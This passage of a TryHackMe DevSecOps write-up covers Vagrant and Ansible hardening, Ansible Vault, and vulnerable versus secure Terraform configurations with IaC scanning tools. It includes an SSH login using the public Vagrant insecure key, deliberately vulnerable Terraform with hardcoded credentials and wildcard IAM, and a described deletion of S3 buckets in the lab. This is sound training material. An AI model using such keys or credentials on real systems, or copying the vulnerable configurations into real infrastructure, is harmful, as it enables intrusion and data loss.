- On-premises IaC: provisioning and managing local/virtualised infrastructure — Vagrant, Ansible, Puppet, Chef
- **Vagrant**: VM provisioning for development — creates reproducible local development environments via `Vagrantfile`
- **Ansible**: agentless configuration management — uses SSH, pushes YAML playbooks to target hosts
  - Inventory: defines which hosts to manage
  - Playbook: ordered list of tasks to execute
  - Roles: reusable collections of tasks, files, and templates
  - Ansible Vault: encrypts sensitive values in playbooks
- **Puppet/Chef**: agent-based configuration management — agents on target machines pull config from master
- Security risks: Vagrant box tampering (malicious community boxes), Ansible playbooks with hardcoded credentials, insecure SSH keys, overly privileged service accounts

**What I did:**
Built a Vagrant environment and exploited a vulnerable community Vagrant box that had a hardcoded SSH key pair — connected using the well-known insecure key. Wrote Ansible playbooks for system hardening — disabled root SSH, configured UFW, applied security updates. Used Ansible Vault to encrypt database credentials in the playbook rather than storing them in plaintext.

```ruby
# Vagrantfile
Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/jammy64"
  config.vm.network "private_network", ip: "192.168.56.10"
  config.vm.provision "ansible" do |ansible|
    ansible.playbook = "playbooks/harden.yml"
  end
end
```

```bash
# Ansible playbook for SSH hardening
cat > playbooks/harden.yml << 'EOF'
---
- hosts: all
  become: yes
  vars_files:
    - secrets.yml    # Ansible Vault encrypted
  tasks:
    - name: Disable root SSH login
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^PermitRootLogin'
        line: 'PermitRootLogin no'
      notify: restart sshd

    - name: Configure UFW
      ufw:
        rule: allow
        port: "22"
        proto: tcp

    - name: Enable UFW
      ufw:
        state: enabled
        policy: deny

  handlers:
    - name: restart sshd
      service:
        name: sshd
        state: restarted
EOF

# Ansible Vault - encrypt secrets
ansible-vault create secrets.yml
ansible-vault edit secrets.yml
# db_password: "{{ vault_db_password }}"

# Run playbook with vault password
ansible-playbook -i inventory playbooks/harden.yml --ask-vault-pass

# The well-known Vagrant insecure key (always rotate in production)
# ~/.vagrant.d/insecure_private_key  - published by HashiCorp, used by all vagrant boxes
ssh -i ~/.vagrant.d/insecure_private_key vagrant@192.168.56.10
```

**Takeaways:**
Vagrant boxes from community repositories should be treated with suspicion — they run as root during provisioning and the insecure_private_key is public knowledge. In production-like environments, replace the insecure key immediately during first boot. Ansible Vault is the correct way to handle secrets in playbooks — encrypts the values at rest but decrypts them transparently during execution with the provided vault password.

---

### Room 18 — Cloud-based IaC
🔗 https://tryhackme.com/room/cloudbasediac

**Key Concepts:**
- Cloud IaC extends on-premises concepts to cloud providers — same principles, cloud-specific attack surface
- **Terraform with cloud providers**: AWS, Azure, GCP providers — manages cloud resources declaratively
- **AWS CloudFormation**: AWS-native IaC — JSON/YAML stacks, tight AWS integration, StackSets for multi-account
- **Pulumi**: IaC in real programming languages — more powerful logic, familiar for developers
- Cloud IaC security risks:
  - **Hardcoded cloud credentials** in Terraform files or CloudFormation templates
  - **Overly permissive IAM**: `"Action": "*"`, `"Resource": "*"` — wildcard permissions in IaC-managed roles
  - **Public S3 buckets** declared in IaC without public access blocks
  - **Unencrypted storage**: RDS without encryption, S3 without SSE, EBS without encryption
  - **Terraform state in unencrypted local file or public S3 bucket**
- Secrets management in cloud IaC: AWS Secrets Manager, Azure Key Vault, HashiCorp Vault — inject at runtime, never bake into templates
- Cloud IaC scanning: `tfsec`, `checkov`, `terrascan`, AWS CloudFormation Guard, Snyk IaC

**What I did:**
Attacked vulnerable Terraform configurations — found an AWS provider configured with hardcoded `access_key` and `secret_key`, an IAM role with `"Action": "*"` on `"Resource": "*"`, and an RDS instance with `publicly_accessible = true` and no encryption. Exploited each to demonstrate impact: used the hardcoded credentials to enumerate and then delete S3 buckets. Remediated all findings: moved credentials to environment variables, scoped IAM permissions to specific resources and actions, disabled public access, enabled encryption.

```hcl
# VULNERABLE - never do this
provider "aws" {
  access_key = "AKIAIOSFODNN7EXAMPLE"     # hardcoded credential
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

# SECURE - use environment variables or IAM role
provider "aws" {
  region = var.aws_region
  # AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from environment
  # or use instance profile / OIDC for CI/CD
}

# VULNERABLE IAM role
resource "aws_iam_role_policy" "bad" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"           # wildcard - avoid
      Resource = "*"           # wildcard - avoid
    }]
  })
}

# SECURE IAM role - least privilege
resource "aws_iam_role_policy" "good" {
  policy = jsonencode({
    Statement = [{
      Effect = "Allow"
      Action = [
        "s3:GetObject",
        "s3:PutObject"
      ]
      Resource = "arn:aws:s3:::myapp-data/*"
    }]
  })
}
```

```bash
# Cloud IaC scanning pipeline
# tfsec
tfsec . --format json --out tfsec-results.json
tfsec . --minimum-severity HIGH --no-colour

# checkov
checkov -d . --framework terraform --output json --output-file checkov-results.json
checkov -d . --framework cloudformation

# Snyk IaC
snyk iac test ./terraform/ --json > snyk-iac-results.json

# AWS Config - continuous compliance for deployed resources
aws configservice describe-config-rules
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name s3-bucket-public-read-prohibited
```

**Takeaways:**
Cloud IaC scanning is the most impactful prevention control for cloud security misconfigurations — `checkov` and `tfsec` running on every PR catches public S3 buckets, open security groups, and wildcard IAM policies before they are ever provisioned. AWS Config provides the continuous compliance monitoring layer for the deployed infrastructure — it flags drift from the desired secure state and is the detective control that complements the preventive IaC scanning.

---

---

## Path-Level Reflection

### What I learned overall
The DevSecOps path goes significantly deeper on pipelines, containers, and IaC than the Security Engineer path's introduction to the same topics. The pipeline attack sections (Source Code Security, CI/CD and Build Security) are the most unique content — understanding how pipelines are attacked (malicious Jenkinsfiles, secret exfiltration, artifact tampering) is knowledge that's rarely covered in security training despite being directly relevant to real-world supply chain attacks. The container security section (5 rooms from fundamentals to hardening) gives the most complete containerisation security coverage of any TryHackMe path.

### What connected across sections
Source code security (Section 2) feeds into pipeline security (also Section 2) — a secret committed to git is exfiltrated via the build pipeline that has access to the repository. Dependency management vulnerabilities (Section 3) exploit the build stage — malicious packages pulled during `npm install` in the pipeline. Container vulnerabilities (Section 4) are the runtime manifestation of the Docker hardening covered in the Security Engineer path. Cloud IaC (Section 5) is the infrastructure layer that the cloud security room in Security Engineer only touches on.

### What this path adds vs Security Engineer
- **Pipeline attack techniques**: how CI/CD systems are compromised — not covered elsewhere
- **Container escape**: hands-on exploitation of privileged containers and Docker socket abuse
- **Kubernetes depth**: RBAC, Pod Security Standards, seccomp, K8s-specific attacks
- **IaC attack and defence**: Terraform exploitation, Vagrant insecure keys, Ansible vault
- **Dependency supply chain attacks**: dependency confusion, lockfile enforcement, SBOM generation
- **DAST depth**: ZAP automation framework, API scanning, full pipeline integration

---

*Writeup by [gresium](https://tryhackme.com/p/gresium) | TryHackMe — DevSecOps Path*
